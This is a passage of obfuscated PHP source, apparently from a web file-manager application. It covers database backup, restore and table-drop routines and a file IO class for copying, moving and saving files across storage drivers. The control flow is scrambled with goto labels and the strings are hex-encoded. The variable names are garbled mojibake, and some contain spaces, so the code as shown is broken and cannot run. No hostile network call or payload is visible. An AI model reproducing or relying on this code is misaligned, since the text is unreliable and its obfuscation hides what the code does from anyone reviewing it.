$CŸêéÍÖíø = '') { $this->database = $C®”Õß¥´Ë; $this->type = $CŸêéÍÖíø; } public function model($E¡ùÜùÒÖ„ = '') { return new ModelBase($E¡ùÜùÒÖ„, $_SERVER[™⁄»üÆ][33], $this->database); } public function db($a»ëóéÚ°» = false) { goto B≈Ωü§Üç¨; fÂÃÕﬁ‚∆ë: $this->database = $A€à◊ˆÒﬁ≤; $eÏÑ®Æâ’Æ->execute("\x75\163\x65\40\140{$cØ ΩÇÑî√}\140"); return $eÏÑ®Æâ’Æ; goto eﬁÆÖÁ∏◊ ; fˆ◊¨¥é¬ˆ: $this->database = $A€à◊ˆÒﬁ≤; $eÏÑ®Æâ’Æ = $this->model()->db(); try { $eû‡éçÂ≥Ø = $eÏÑ®Æâ’Æ->execute("\163\150\x6f\167\x20\x64\141\164\x61\x62\x61\x73\x65\x73\x20\x6c\x69\153\145\40\x27{$cØ ΩÇÑî√}\x27"); } catch (Exception $fºÂßÛ‡Êë) { } goto fﬁêË¬ÆëΩ; fﬁêË¬ÆëΩ: if (!$eû‡éçÂ≥Ø) { $eÏÑ®Æâ’Æ->execute("\x63\162\x65\x61\164\145\40\x64\141\x74\141\142\x61\x73\145\40\140{$cØ ΩÇÑî√}\x60"); } $A€à◊ˆÒﬁ≤[$eã†«πÖë◊[939]] = $cØ ΩÇÑî√; if ($A€à◊ˆÒﬁ≤[$eã†«πÖë◊[773]] == $eã†«πÖë◊[774]) { $A€à◊ˆÒﬁ≤[$eã†«πÖë◊[775]] .= $eã†«πÖë◊[1026] . $cØ ΩÇÑî√; } goto fÂÃÕﬁ‚∆ë; B≈Ωü§Üç¨: $eã†«πÖë◊ =& $_SERVER[™⁄»üÆ]; $A€à◊ˆÒﬁ≤ = array_change_key_case($this->database); if ($this->type == $eã†«πÖë◊[9] || !$a»ëóéÚ°») { return $this->model()->db(); } goto Fï¨ì¥ﬁÎ¯; Fï¨ì¥ﬁÎ¯: $cØ ΩÇÑî√ = $A€à◊ˆÒﬁ≤[$eã†«πÖë◊[939]]; $A€à◊ˆÒﬁ≤[$eã†«πÖë◊[939]] = $eã†«πÖë◊[33]; if ($A€à◊ˆÒﬁ≤[$eã†«πÖë◊[773]] == $eã†«πÖë◊[774]) { $EÖ“êÛ¶¡í = $A€à◊ˆÒﬁ≤[$eã†«πÖë◊[775]]; $A€à◊ˆÒﬁ≤[$eã†«πÖë◊[775]] = substr($EÖ“êÛ¶¡í, 0, strrpos($EÖ“êÛ¶¡í, $eã†«πÖë◊[1026])); } goto fˆ◊¨¥é¬ˆ; eﬁÆÖÁ∏◊ : } public function createTable($fÏÂòÃ¡ÿ«, $fëïèé‡ÀÖ = null) { $EÖÈºÍí’π =& $_SERVER[™⁄»üÆ]; if (!IO::exist($fÏÂòÃ¡ÿ«)) { ActionCall($EÖÈºÍí’π[1027], !0, 0); show_json(LNG($EÖÈºÍí’π[1028]), !1); } $Bä™√Ìüà = sqlSplit(IO::getContent($fÏÂòÃ¡ÿ«)); foreach ($Bä™√Ìüà as $eßÁ√»Ω¥¯) { if ($fëïèé‡ÀÖ) { $CÆÕ√Ωë”é = stripos($eßÁ√»Ω¥¯, $EÖÈºÍí’π[1029]) === 0; if ($CÆÕ√Ωë”é) { $fëïèé‡ÀÖ->task[$EÖÈºÍí’π[1030]] += 1; } } $this->model()->db()->execute($eßÁ√»Ω¥¯); if ($fëïèé‡ÀÖ && $CÆÕ√Ωë”é) { preg_match($EÖÈºÍí’π[1031], $eßÁ√»Ω¥¯, $e∏ö¯•øÓä); $fëïèé‡ÀÖ->task[$EÖÈºÍí’π[1032]] = $e∏ö¯•øÓä[1]; $fëïèé‡ÀÖ->update(1); } } $this->taskToCache($fëïèé‡ÀÖ); } public function insertTable($BÀ∆˜ÜéÊì, $c∫Ö¯‚¿≥å = null) { $f§ñﬂÛé⁄® =& $_SERVER[™⁄»üÆ]; $bîß≥‡ÙöÆ = $this->model()->db(); $A∂ÚÓ∑≥≠ë = $c†´ﬁá£ãç ? array($c†´ﬁá£ãç) : $bîß≥‡ÙöÆ->getTables(); foreach ($BÀ∆˜ÜéÊì as $eõ≠≠ƒïÇÙ) { $c†´ﬁá£ãç = basename($eõ≠≠ƒïÇÙ, $f§ñﬂÛé⁄®[765]); if (!in_array($c†´ﬁá£ãç, $A∂ÚÓ∑≥≠ë)) { continue; } if ($c∫Ö¯‚¿≥å) { $c∫Ö¯‚¿≥å->task[$f§ñﬂÛé⁄®[1032]] = $c†´ﬁá£ãç; } if (get_filesize($eõ≠≠ƒïÇÙ) == 0) { continue; } $b˜ê…ª—Á = $this->sqlToDb($eõ≠≠ƒïÇÙ, $c∫Ö¯‚¿≥å); if (!$b˜ê…ª—Á) { ActionCall($f§ñﬂÛé⁄®[1027], !0, 0); show_json(LNG($f§ñﬂÛé⁄®[1033]) . "\x5b{$c†´ﬁá£ãç}\x5d", !1); } } $this->taskToCache($c∫Ö¯‚¿≥å); } public function sqlFromDb($aÙ¬°ò‡ü, $Bÿ¯Üâé©Ó, $Fú©õí§ÈÂ = null, $a™ÛÉœ∞∑° = null) { goto CÔÏÚ§åä≈; CÔÏÚ§åä≈: if ($Fú©õí§ÈÂ) { $Fú©õí§ÈÂ->task[$_SERVER[™⁄»üÆ][1032]] = $aÙ¬°ò‡ü; } $bÆﬁÂÒ™§‹ = $this->model($aÙ¬°ò‡ü); $Dïœéƒ»ç’ = 0; goto c§æí ïÎß; eﬂÈÕòè˘Ç: fclose($aÖéÉº‰‰”); return $Dïœéƒ»ç’; goto B˘µô≤‰Ç§; Eºœù»πÿû: $CúäÿØ≥ÓË = $bÆﬁÂÒ™§‹->getPk(); $A©º»ûåè™ = $bÆﬁÂÒ™§‹->getDbFields(); do { $c‹ˆÜ¶Ö¨ı = array($CúäÿØ≥ÓË => array($_SERVER[™⁄»üÆ][981], $B•ÉÆç€¶€)); $fÌœ˘ÒΩ†ª = $bÆﬁÂÒ™§‹->where($c‹ˆÜ¶Ö¨ı)->field($A©º»ûåè™)->order($CúäÿØ≥ÓË . $_SERVER[™⁄»üÆ][1035])->limit($bÉÑªÙì¢ã)->select(); $fÌœ˘ÒΩ†ª = !empty($fÌœ˘ÒΩ†ª) ? $fÌœ˘ÒΩ†ª : array(); if (!($eÃê¨éó˘£ = count($fÌœ˘ÒΩ†ª))) { break; } $bÊﬂïÉÕë˜ = end($fÌœ˘ÒΩ†ª); $B•ÉÆç€¶€ = $bÊﬂïÉÕë˜[$CúäÿØ≥ÓË]; $b¢ë∂®ˆÑê = array(); foreach ($fÌœ˘ÒΩ†ª as $dæπ„éΩ÷´) { if ($aÙ¬°ò‡ü == $_SERVER[™⁄»üÆ][1036] && $dæπ„éΩ÷´[$_SERVER[™⁄»üÆ][29]] == $_SERVER[™⁄»üÆ][1037]) { $F¬æÊ‡Ö£ä = json_decode($dæπ„éΩ÷´[$_SERVER[™⁄»üÆ][372]], !0); if ($F¬æÊ‡Ö£ä[$_SERVER[™⁄»üÆ][28]] == date($_SERVER[™⁄»üÆ][730]) && !$F¬æÊ‡Ö£ä[$_SERVER[™⁄»üÆ][729]]) { continue; } } if ($a™ÛÉœ∞∑°) { $dæπ„éΩ÷´[$_SERVER[™⁄»üÆ][76]] = "\173\151\157\x3a{$a™ÛÉœ∞∑°}\175" . substr($dæπ„éΩ÷´[$_SERVER[™⁄»üÆ][76]], strlen("\173\151\157\72{$dæπ„éΩ÷´[$_SERVER[™⁄»üÆ][801]]}\x7d")); $dæπ„éΩ÷´[$_SERVER[™⁄»üÆ][801]] = $a™ÛÉœ∞∑°; } $b¢ë∂®ˆÑê[] = $_SERVER[™⁄»üÆ][1038] . $this->sqlEncode($dæπ„éΩ÷´) . $_SERVER[™⁄»üÆ][1039]; } $e’…É¨àÇ” = "\111\116\123\105\x52\x54\40\111\116\124\x4f\40\x60{$aÙ¬°ò‡ü}\x60\40\x28\x60" . implode($_SERVER[™⁄»üÆ][1040], $A©º»ûåè™) . $_SERVER[™⁄»üÆ][1041]; fwrite($aÖéÉº‰‰”, $e’…É¨àÇ” . implode($_SERVER[™⁄»üÆ][1042], $b¢ë∂®ˆÑê) . $_SERVER[™⁄»üÆ][68] . PHP_EOL); $Dïœéƒ»ç’ += $eÃê¨éó˘£; if ($Fú©õí§ÈÂ) { $Fú©õí§ÈÂ->update($eÃê¨éó˘£); } } while ($bÉÑªÙì¢ã == $eÃê¨éó˘£); goto eﬂÈÕòè˘Ç; c§æí ïÎß: $B•ÉÆç€¶€ = 0; $bÉÑªÙì¢ã = 10000; $aÖéÉº‰‰” = fopen($Bÿ¯Üâé©Ó, $_SERVER[™⁄»üÆ][1034]); goto Eºœù»πÿû; B˘µô≤‰Ç§: } public function sqlToDb($aõ¶À≤Û«â, $B™üÉ∂®îÁ = null) { goto D÷æ‚‚é°“; D∑®ö’è⁄Î: $BŒÑÇ˜äíÖ = 0; $Eìœ§óπÀÙ = 4194304 - 104858; $E‹í“π–≤î = 1000000 - 104858; goto cÌ¯™Ñê“Ö; A·—Ãö™§Ü: return !0; goto DÏ †§ï◊¨; aæıﬁØƒ§: if (!$f–ÀË™Ç±≤) { return !1; } $b¡àˆ◊ºá = 0; $aÕ‚º–îãﬁ = $eœÎ≥®◊∂[33]; goto eŒ ØŸõßü; D÷æ‚‚é°“: $eœÎ≥®◊∂ =& $_SERVER[™⁄»üÆ]; $b•Üª““è¶ = $this->model()->db(); $f–ÀË™Ç±≤ = @fopen($aõ¶À≤Û«â, $eœÎ≥®◊∂[1043]); goto aæıﬁØƒ§; eŒ ØŸõßü: $AæÊå‹«ö® = array(); $bﬁÌàÑ’»§ = $this->type == $eœÎ≥®◊∂[9] ? 500 : 2000; $DíÙîé”¶ù = basename($aõ¶À≤Û«â, $eœÎ≥®◊∂[765]); goto D∑®ö’è⁄Î; cÌ¯™Ñê“Ö: while (!feof($f–ÀË™Ç±≤)) { $cúäÉõ›è– = trim(fgets($f–ÀË™Ç±≤)); if (!$cúäÉõ›è–) { continue; } $Cë’“∑õµ¥ = $this->sqlDecode($cúäÉõ›è–, $this->type); if (stripos($Cë’“∑õµ¥, $eœÎ≥®◊∂[353]) === 0) { if (!$aÕ‚º–îãﬁ) { $aÕ‚º–îãﬁ = $Cë’“∑õµ¥ . $eœÎ≥®◊∂[50]; } continue; } if ($B™üÉ∂®îÁ) { $B™üÉ∂®îÁ->task[$eœÎ≥®◊∂[1030]] += 1; } $b¡àˆ◊ºá++; $AæÊå‹«ö®[] = rtrim(rtrim(trim($Cë’“∑õµ¥), $eœÎ≥®◊∂[47]), $eœÎ≥®◊∂[68]); $dŒúµÚ∞Éı = null; $dÊŸí·Í∂Ì = strlen($Cë’“∑õµ¥); $BŒÑÇ˜äíÖ += $dÊŸí·Í∂Ì; if ($BŒÑÇ˜äíÖ >= ($bﬁÌàÑ’»§ == 500 ? $Eìœ§óπÀÙ : $E‹í“π–≤î)) { $dŒúµÚ∞Éı = array_pop($AæÊå‹«ö®); if ($b¡àˆ◊ºá > 1) { $b¡àˆ◊ºá--; } } if ($b¡àˆ◊ºá >= $bﬁÌàÑ’»§ || $dŒúµÚ∞Éı) { goto FÜÆ≤Òïè›; FÜÆ≤Òïè›: $Cë’“∑õµ¥ = $aÕ‚º–îãﬁ . implode($eœÎ≥®◊∂[47], $AæÊå‹«ö®); if (!$b•Üª““è¶->execute($Cë’“∑õµ¥)) { return !1; } if ($B™üÉ∂®îÁ) { $B™üÉ∂®îÁ->update($b¡àˆ◊ºá); } goto eÚ≈Œéì˘é; eÚ≈Œéì˘é: $AæÊå‹«ö® = array(); $b¡àˆ◊ºá = 0; $BŒÑÇ˜äíÖ = 0; goto bå«›°™∆õ; bå«›°™∆õ: if ($dŒúµÚ∞Éı) { $AæÊå‹«ö® = array($dŒúµÚ∞Éı); $b¡àˆ◊ºá = 1; $BŒÑÇ˜äíÖ = $dÊŸí·Í∂Ì; } goto dﬂ¶äÛíò; dﬂ¶äÛíò: } } fclose($f–ÀË™Ç±≤); if (!empty($AæÊå‹«ö®)) { $Cë’“∑õµ¥ = $aÕ‚º–îãﬁ . implode($eœÎ≥®◊∂[47], $AæÊå‹«ö®); if (!$b•Üª““è¶->execute($Cë’“∑õµ¥)) { return !1; } if ($B™üÉ∂®îÁ) { $B™üÉ∂®îÁ->update($b¡àˆ◊ºá); } } goto A·—Ãö™§Ü; DÏ †§ï◊¨: } public function dropTable($fÌÍÓÂØ°§ = null) { $dãÓ¨ùñ°ç = $this->model()->db(); $e©èíçÓﬂŒ = $fÌÍÓÂØ°§ ? array($fÌÍÓÂØ°§) : $dãÓ¨ùñ°ç->getTables(); if (!$e©èíçÓﬂŒ) { return; } foreach ($e©èíçÓﬂŒ as $fÌÍÓÂØ°§) { if ($fÌÍÓÂØ°§) { $fÌÍÓÂØ°§ = strtolower($fÌÍÓÂØ°§); } else { continue; } $dãÓ¨ùñ°ç->execute("\144\162\157\160\x20\164\141\142\154\145\x20\151\x66\40\145\170\x69\x73\164\163\40\x60{$fÌÍÓÂØ°§}\x60"); } } private function taskToCache($BªêâÑêáÈ = null) { $d–º≈∑°◊è =& $_SERVER[™⁄»üÆ]; if (!$BªêâÑêáÈ) { return; } $cáãÑ˘à≠ë = array($d–º≈∑°◊è[1032] => $BªêâÑêáÈ->task[$d–º≈∑°◊è[1032]], $d–º≈∑°◊è[1030] => $BªêâÑêáÈ->task[$d–º≈∑°◊è[1030]], $d–º≈∑°◊è[1044] => $BªêâÑêáÈ->task[$d–º≈∑°◊è[1044]]); if ($cáãÑ˘à≠ë[$d–º≈∑°◊è[1030]] == $cáãÑ˘à≠ë[$d–º≈∑°◊è[1044]]) { $cáãÑ˘à≠ë[$d–º≈∑°◊è[739]] = 1; } Cache::set($d–º≈∑°◊è[1045] . $BªêâÑêáÈ->task[$d–º≈∑°◊è[394]], $cáãÑ˘à≠ë); $BªêâÑêáÈ->end(); } private function sqlEncode($c•∏ŒÃ‡ô¶) { $F÷»ñËèÑœ =& $_SERVER[™⁄»üÆ]; $a¯”ûÖ¢‡« = array(); foreach ($c•∏ŒÃ‡ô¶ as $e°€≥∏ûóÃ) { if (is_array($e°€≥∏ûóÃ)) { $e°€≥∏ûóÃ = json_encode_force($e°€≥∏ûóÃ); } $e°€≥∏ûóÃ = addslashes($e°€≥∏ûóÃ); $e°€≥∏ûóÃ = str_replace(array($F÷»ñËèÑœ[1046], $F÷»ñËèÑœ[229]), array($F÷»ñËèÑœ[1047], $F÷»ñËèÑœ[1048]), $e°€≥∏ûóÃ); $a¯”ûÖ¢‡«[] = str_replace($F÷»ñËèÑœ[55], $F÷»ñËèÑœ[1049], $e°€≥∏ûóÃ); } return $F÷»ñËèÑœ[55] . implode($F÷»ñËèÑœ[1050], $a¯”ûÖ¢‡«) . $F÷»ñËèÑœ[55]; } private function sqlDecode($F‡†è„≤Ωé, $f±ÁùÃÃﬂÁ) { $A¶ïıìÇíï =& $_SERVER[™⁄»üÆ]; $F‡†è„≤Ωé = str_replace(array($A¶ïıìÇíï[1047], $A¶ïıìÇíï[1048]), array($A¶ïıìÇíï[1046], $A¶ïıìÇíï[229]), $F‡†è„≤Ωé); if ($f±ÁùÃÃﬂÁ == $A¶ïıìÇíï[9]) { $F‡†è„≤Ωé = stripslashes($F‡†è„≤Ωé); } return $F‡†è„≤Ωé; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($c¢‡å√éüÉ, $b≠®ﬂÉæΩÜ) { goto e¥π‰®Í»Ï; C˘“Éµ©–›: Hook::trigger($BπÆôí‚Ö¨[1052] . $c¢‡å√éüÉ . $BπÆôí‚Ö¨[1053], $FﬁÏà«Õû˜); $dú†ÿ∏·∫Ç = self::driverMake($b≠®ﬂÉæΩÜ[0]); if (method_exists($dú†ÿ∏·∫Ç, $c¢‡å√éüÉ)) { $BÀﬁ‘à⁄Õ∆ = @call_user_func_array(array($dú†ÿ∏·∫Ç, $c¢‡å√éüÉ), $b≠®ﬂÉæΩÜ); } else { if (method_exists($dú†ÿ∏·∫Ç, $BπÆôí‚Ö¨[1054])) { $BÀﬁ‘à⁄Õ∆ = @call_user_func_array(array($dú†ÿ∏·∫Ç, $c¢‡å√éüÉ), $b≠®ﬂÉæΩÜ); } else { if (method_exists(self, $c¢‡å√éüÉ)) { $BÀﬁ‘à⁄Õ∆ = @call_user_func_array(array(self, $c¢‡å√éüÉ), $b≠®ﬂÉæΩÜ); } else { $BÀﬁ‘à⁄Õ∆ = call_user_func_array(array(parent, $c¢‡å√éüÉ), $b≠®ﬂÉæΩÜ); } } } goto A≈âÁÌßØ¯; A≈âÁÌßØ¯: Hook::trigger($BπÆôí‚Ö¨[1052] . $c¢‡å√éüÉ . $BπÆôí‚Ö¨[1055], $FﬁÏà«Õû˜, $BÀﬁ‘à⁄Õ∆); return $BÀﬁ‘à⁄Õ∆; goto AØ≈Îº¿æô; e¥π‰®Í»Ï: $BπÆôí‚Ö¨ =& $_SERVER[™⁄»üÆ]; $FﬁÏà«Õû˜ = $b≠®ﬂÉæΩÜ; $GLOBALS[$BπÆôí‚Ö¨[1051]] = $BπÆôí‚Ö¨[1052] . $c¢‡å√éüÉ; goto C˘“Éµ©–›; AØ≈Îº¿æô: } public static function init($Fè¬œ≥Àì) { return self::driverMake($Fè¬œ≥Àì); } public static function copy($FáüÈÉ≥Õﬂ, $E•⁄ÆâäÜß, $Eö§¿Ìé∑∞ = false, $aç¶å“¨—ç = false) { return self::copyMoveStart($FáüÈÉ≥Õﬂ, $E•⁄ÆâäÜß, $Eö§¿Ìé∑∞, $_SERVER[™⁄»üÆ][532], $aç¶å“¨—ç); } public static function move($e∞ô◊öÊ∫¡, $CèóÂ√òæ∫, $e»ª¿‹î√Ÿ = false, $C≤…É€∏¿à = false) { return self::copyMoveStart($e∞ô◊öÊ∫¡, $CèóÂ√òæ∫, $e»ª¿‹î√Ÿ, $_SERVER[™⁄»üÆ][534], $C≤…É€∏¿à); } private static function copyMoveStart($bùüÀÑΩâ…, $cß’¡ß∆»Î, $b®§◊ÂÖ≈ù, $d«Ê¶ê≠¢≈, $B›Ô∞öÖõå) { $c⁄Á©ÊÙê¶ =& $_SERVER[™⁄»üÆ]; $c¢í ëòÔ = array($bùüÀÑΩâ…, $cß’¡ß∆»Î, $b®§◊ÂÖ≈ù, $B›Ô∞öÖõå); Hook::trigger($c⁄Á©ÊÙê¶[1052] . $d«Ê¶ê≠¢≈ . $c⁄Á©ÊÙê¶[1053], $c¢í ëòÔ); $FÉ„◊åõ´ã = self::copyMove($bùüÀÑΩâ…, $cß’¡ß∆»Î, $b®§◊ÂÖ≈ù, $d«Ê¶ê≠¢≈, $B›Ô∞öÖõå); Hook::trigger($c⁄Á©ÊÙê¶[1052] . $d«Ê¶ê≠¢≈ . $c⁄Á©ÊÙê¶[1055], $c¢í ëòÔ, $FÉ„◊åõ´ã); return $FÉ„◊åõ´ã; } public static function saveFile($EÈê“‡–™Î, $F·≤≥—ÒÜ∆, $F∏Éœ¬ıñå = true) { goto EôÃéÏÚœâ; fÆúª»Œ—˜: $a‘µôÁóÙ = self::driverMake($F·≤≥—ÒÜ∆); $E±ûƒö≤Ú› = !1; if ($a‘µôÁóÙ->pathParse[$F´¯µ«ƒ¥›[1056]]) { $E±ûƒö≤Ú› = $a‘µôÁóÙ; $a‘µôÁóÙ = self::driverMake($a‘µôÁóÙ->pathParse[$F´¯µ«ƒ¥›[1056]]); } goto Eêç◊‹¿ú»; B÷›êà¿âﬂ: return $eÇ˘ª∑◊ÌÜ; goto cèÀâÑıƒä; EôÃéÏÚœâ: $F´¯µ«ƒ¥› =& $_SERVER[™⁄»üÆ]; $bç√Ô§î•± = self::info($F·≤≥—ÒÜ∆); $aπê••ÑËÂ = self::driverMake($EÈê“‡–™Î); goto fÆúª»Œ—˜; D∂‡›ÇÍÆ§: if (!$F∏Éœ¬ıñå && self::driverIsSame($aπê••ÑËÂ, $a‘µôÁóÙ)) { $B¥ﬁ´ó—√≠ = !1; } $eÇ˘ª∑◊ÌÜ = self::copyFile($aπê••ÑËÂ, $EÈê“‡–™Î, $a‘µôÁóÙ, $eÉ“…«Ì¿‰, $bç√Ô§î•±[$F´¯µ«ƒ¥›[28]], $B¥ﬁ´ó—√≠); if ($E±ûƒö≤Ú›) { $eÇ˘ª∑◊ÌÜ = $E±ûƒö≤Ú›->getPathOuter($eÇ˘ª∑◊ÌÜ); } goto B÷›êà¿âﬂ; Eêç◊‹¿ú»: if ($aπê••ÑËÂ->pathParse[$F´¯µ«ƒ¥›[1056]]) { $aπê••ÑËÂ = self::driverMake($aπê••ÑËÂ->pathParse[$F´¯µ«ƒ¥›[1056]]); } $eÉ“…«Ì¿‰ = $a‘µôÁóÙ->pathFather($F·≤≥—ÒÜ∆); $B¥ﬁ´ó—√≠ = !0; goto D∂‡›ÇÍÆ§; cèÀâÑıƒä: } private static function copyMove($Aªõ±åÔøà, $Fã–ø…‘¿≥, $e‰©¢ôúè†, $a–üÓ†à÷ï, $b‹¶µç√œ• = false) { goto FÏåí„ÁÒ‘; f©úˆËÑ§Ö: $FºµüÊå“ä = self::driverMake($Aªõ±åÔøà); $d‚»òõá¢Ω = self::driverMake($Fã–ø…‘¿≥); $F∏Ë˘Ç«Ûæ = $a–üÓ†à÷ï == $Aå◊£Ù∂´ã[534]; goto e”«âÀÜıò; e”«âÀÜıò: $c≠ÂÜÔÓ€Ì = !1; if ($d‚»òõá¢Ω->pathParse[$Aå◊£Ù∂´ã[1056]]) { $c≠ÂÜÔÓ€Ì = $d‚»òõá¢Ω; $d‚»òõá¢Ω = self::driverMake($d‚»òõá¢Ω->pathParse[$Aå◊£Ù∂´ã[1056]]); } if ($FºµüÊå“ä->pathParse[$Aå◊£Ù∂´ã[1056]]) { $FºµüÊå“ä = self::driverMake($FºµüÊå“ä->pathParse[$Aå◊£Ù∂´ã[1056]]); } goto E∫Í´µÓíÓ; FÏåí„ÁÒ‘: $Aå◊£Ù∂´ã =& $_SERVER[™⁄»üÆ]; if (!$Aªõ±åÔøà || $Aªõ±åÔøà == $Aå◊£Ù∂´ã[8] || !$Fã–ø…‘¿≥) { return !1; } ignore_timeout(); goto f©úˆËÑ§Ö; A∑˘ô€≠≠◊: if ($f·–€ùè™ç) { if ($a–üÓ†à÷ï == $Aå◊£Ù∂´ã[534] && !method_exists($d‚»òõá¢Ω, $Aå◊£Ù∂´ã[1057]) && trim($Fã–ø…‘¿≥, $Aå◊£Ù∂´ã[8]) == trim($d‚»òõá¢Ω->pathFather($Aªõ±åÔøà), $Aå◊£Ù∂´ã[8])) { if ($FºµüÊå“ä->pathThis($Aªõ±åÔøà) != $b‹¶µç√œ• && !$FºµüÊå“ä->isTypeObject()) { return $FºµüÊå“ä->rename($Aªõ±åÔøà, $b‹¶µç√œ•); } return $d‚»òõá¢Ω->getPathOuter($Aªõ±åÔøà); } if (method_exists($d‚»òõá¢Ω, $a–üÓ†à÷ï)) { return $d‚»òõá¢Ω->{$a–üÓ†à÷ï}($Aªõ±åÔøà, $Fã–ø…‘¿≥, $e‰©¢ôúè†); } } $BËƒ—¿Ôãü = $FºµüÊå“ä->isFile($Aªõ±åÔøà); if (!$BËƒ—¿Ôãü && $d‚»òõá¢Ω->getType() == $Aå◊£Ù∂´ã[737] && $FºµüÊå“ä->getType() == $Aå◊£Ù∂´ã[106]) { $d§á•◊¥Á = $d‚»òõá¢Ω->copyFolderFromIO($FºµüÊå“ä, $Aªõ±åÔøà, $Fã–ø…‘¿≥, $e‰©¢ôúè†, $F∏Ë˘Ç«Ûæ, $b‹¶µç√œ•); } else { $d§á•◊¥Á = self::copyPath($FºµüÊå“ä, $Aªõ±åÔøà, $d‚»òõá¢Ω, $Fã–ø…‘¿≥, $e‰©¢ôúè†, $F∏Ë˘Ç«Ûæ, $BËƒ—¿Ôãü, $b‹¶µç√œ•); } goto f†ãñŸ”Îê; f†ãñŸ”Îê: if ($d§á•◊¥Á && $F∏Ë˘Ç«Ûæ) { $FºµüÊå“ä->remove($Aªõ±åÔøà); } if ($c≠ÂÜÔÓ€Ì) { $d§á•◊¥Á = $c≠ÂÜÔÓ€Ì->getPathOuter($d§á•◊¥Á); } return $d§á•◊¥Á; goto e·π–ê‘µÖ; E∫Í´µÓíÓ: self::check($FºµüÊå“ä, $Aªõ±åÔøà, $d‚»òõá¢Ω, $Fã–ø…‘¿≥); Hook::trigger($Aå◊£Ù∂´ã[73], $FºµüÊå“ä, $Aªõ±åÔøà, $d‚»òõá¢Ω, $Fã–ø…‘¿≥); $f·–€ùè™ç = self::driverIsSame($FºµüÊå“ä, $d‚»òõá¢Ω); goto A∑˘ô€≠≠◊; e·π–ê‘µÖ: } private static function check($bÁ„Ω´°‰›, $eÒƒå…üáÕ, $AÃ”∫∂âŸ∫, &$F§îÒÓó≈´) { $DÍ‡≈Á“›Ò =& $_SERVER[™⁄»üÆ]; if (self::driverIsSame($bÁ„Ω´°‰›, $AÃ”∫∂âŸ∫) && $bÁ„Ω´°‰›->isFolder($eÒƒå…üáÕ) && $bÁ„Ω´°‰›->isParentOf($eÒƒå…üáÕ, $F§îÒÓó≈´)) { show_json(LNG($DÍ‡≈Á“›Ò[1058]), !1); } if (!$bÁ„Ω´°‰›->exist($eÒƒå…üáÕ)) { show_json(LNG($DÍ‡≈Á“›Ò[105]), !1); } } private static function copyPath($BîªßÒ«ıæ, $D≠«Ó™Œõ¶, $c≈äªãÖéÌ, $fﬁøÑÁÁÖÍ, $dëÂ£éôºÚ, $e±™ËÜñÚ±, $E—€ã›∫Ωï, $Eßô—áﬂª˘ = false) { goto F·Ì¯É⁄ÜÑ; eÔπ◊‹ﬂ∆È: self::copyMoveKeepInfo($BîªßÒ«ıæ, $D≠«Ó™Œõ¶, $fÛ—®”äÏî); return $fÛ—®”äÏî; goto bÕ€äø∞«õ; fÚ‡ê≥íâµ: $fÛ—®”äÏî = $c≈äªãÖéÌ->mkdir($c≈äªãÖéÌ->getPath($Bå›º√Ò÷Ç)); $fﬁøÑÁÁÖÍ = $c≈äªãÖéÌ->getPathInner($fÛ—®”äÏî); $AÍÔΩ∑À≈í = $BîªßÒ«ıæ->listPath($D≠«Ó™Œõ¶, !0); goto e‰ﬁ√Ü˘ßâ; EøÕËöüÃ: if ($E—€ã›∫Ωï) { return self::copyFile($BîªßÒ«ıæ, $D≠«Ó™Œõ¶, $c≈äªãÖéÌ, $fﬁøÑÁÁÖÍ, $EŸ“À§ﬁçÆ, $e±™ËÜñÚ±); } if ($dëÂ£éôºÚ == REPEAT_RENAME_FOLDER) { $dëÂ£éôºÚ = !1; } $Bå›º√Ò÷Ç = rtrim($fﬁøÑÁÁÖÍ, $AÏ¥Õ‹Éêâ[8]) . $AÏ¥Õ‹Éêâ[8] . $EŸ“À§ﬁçÆ; goto fÚ‡ê≥íâµ; e‰ﬁ√Ü˘ßâ: $AÍÔΩ∑À≈í = is_array($AÍÔΩ∑À≈í) ? $AÍÔΩ∑À≈í : array($AÏ¥Õ‹Éêâ[74] => array(), $AÏ¥Õ‹Éêâ[75] => array()); $Eå”‡ è’ì = array_merge($AÍÔΩ∑À≈í[$AÏ¥Õ‹Éêâ[74]], $AÍÔΩ∑À≈í[$AÏ¥Õ‹Éêâ[75]]); foreach ($Eå”‡ è’ì as $bì∑êçñ≤°) { $d√Ø¯ØÊ‹ = $bì∑êçñ≤°[$AÏ¥Õ‹Éêâ[29]] == $AÏ¥Õ‹Éêâ[193]; $D≠«Ó™Œõ¶ = $BîªßÒ«ıæ->getPathInner($bì∑êçñ≤°[$AÏ¥Õ‹Éêâ[76]]); $Fù≠ÊÉó¥œ = self::copyPath($BîªßÒ«ıæ, $D≠«Ó™Œõ¶, $c≈äªãÖéÌ, $fﬁøÑÁÁÖÍ, $dëÂ£éôºÚ, $e±™ËÜñÚ±, $d√Ø¯ØÊ‹); if (!$Fù≠ÊÉó¥œ) { IO::errorTips($AÏ¥Õ‹Éêâ[1059] . $D≠«Ó™Œõ¶ . $AÏ¥Õ‹Éêâ[67] . $fﬁøÑÁÁÖÍ); } } goto eÔπ◊‹ﬂ∆È; F·Ì¯É⁄ÜÑ: $AÏ¥Õ‹Éêâ =& $_SERVER[™⁄»üÆ]; $EŸ“À§ﬁçÆ = empty($Eßô—áﬂª˘) && $Eßô—áﬂª˘ !== $AÏ¥Õ‹Éêâ[191] ? $BîªßÒ«ıæ->pathThis($D≠«Ó™Œõ¶) : $Eßô—áﬂª˘; if ($dëÂ£éôºÚ) { $c∑çÇû¨≤Ã = $c≈äªãÖéÌ->fileNameExist($fﬁøÑÁÁÖÍ, $EŸ“À§ﬁçÆ); $EŸ“À§ﬁçÆ = $c≈äªãÖéÌ->fileNameAuto($fﬁøÑÁÁÖÍ, $EŸ“À§ﬁçÆ, $dëÂ£éôºÚ, !$E—€ã›∫Ωï); $dëÂ£éôºÚ = $c∑çÇû¨≤Ã ? $dëÂ£éôºÚ : !1; } goto EøÕËöüÃ; bÕ€äø∞«õ: } private static function copyFile($dóóì◊‡Ìñ, $Fá⁄âê¬ﬂê, $cçÛπä∆ﬁ–, $DÚÁ§ùßË¿, $cÂ˘Ç™ªêˆ, $D–¯…•¯ÃÙ) { goto Däñ√∫⁄≈¶; Däñ√∫⁄≈¶: $E™©–«áëÕ =& $_SERVER[™⁄»üÆ]; $DÚÁ§ùßË¿ = $cçÛπä∆ﬁ–->getPath(rtrim($DÚÁ§ùßË¿, $E™©–«áëÕ[8]) . $E™©–«áëÕ[8] . $cÂ˘Ç™ªêˆ); $A€ƒô≥’Íñ = $E™©–«áëÕ[1060] . time() . rand_string(5); goto Eç∏Êø¥π≠; c„•ûçÉ’: self::remove($d÷∫¯∏Ô‡∂); 